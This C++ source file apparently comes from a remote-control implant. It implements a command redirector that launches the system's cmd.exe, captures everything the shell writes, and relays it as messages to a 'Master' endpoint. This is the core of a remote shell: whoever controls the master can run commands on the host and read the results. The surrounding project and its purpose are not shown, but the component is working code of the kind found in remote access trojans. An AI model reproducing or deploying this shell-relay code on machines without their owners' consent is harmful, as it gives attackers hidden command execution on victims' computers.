#include "stdafx.h"
#include <shlobj.h>
#include "CommData.h"
#include "MessageDefines.h"
#include "CommManager.h"
#include "CmdRedirector.h"

#pragma comment(lib, "shell32.lib")

CmdRedirector::CmdRedirector()
{
}

CmdRedirector::~CmdRedirector()
{

}

BOOL CmdRedirector::Start()
{
	TCHAR szPath[MAX_PATH] = {0};
	::SHGetSpecialFolderPath( NULL, szPath, CSIDL_SYSTEM, FALSE );
	tstring cmdFilepath = szPath;
	if (cmdFilepath.size() > 0 && cmdFilepath.back() != '\\') cmdFilepath += '\\';
	cmdFilepath += _T("cmd.exe");

	return StartChildProcess(cmdFilepath.c_str(), FALSE);
}

void CmdRedirector::Stop()
{
	TerminateChildProcess();
}

void CmdRedirector::OnChildStarted( LPCSTR lpszCmdLine )
{
	
}

void CmdRedirector::OnChildStdErrWrite( LPCSTR lpszOutput )
{
	SendOutput(lpszOutput);
}

void CmdRedirector::OnChildStdOutWrite( LPCSTR lpszOutput )
{
	SendOutput(lpszOutput);
}

void CmdRedirector::OnChildTerminate()
{
	//SendOutput("PROCESS TERMINATED.");
	//CommManager::GetInstanceRef().CleanMsgByMSGID(MSGID_CMDREDIRECT_OUTPUT);
}

void CmdRedirector::SendOutput( LPCSTR output )
{
	CommData commData;
	commData.SetMsgID(MSGID_CMDREDIRECT_OUTPUT);
	commData.SetByteData((const LPBYTE)output, strlen(output) + 1);

	CommManager::GetInstanceRef().PushMsgToMaster(COMMNAME_DEFAULT, commData);
}
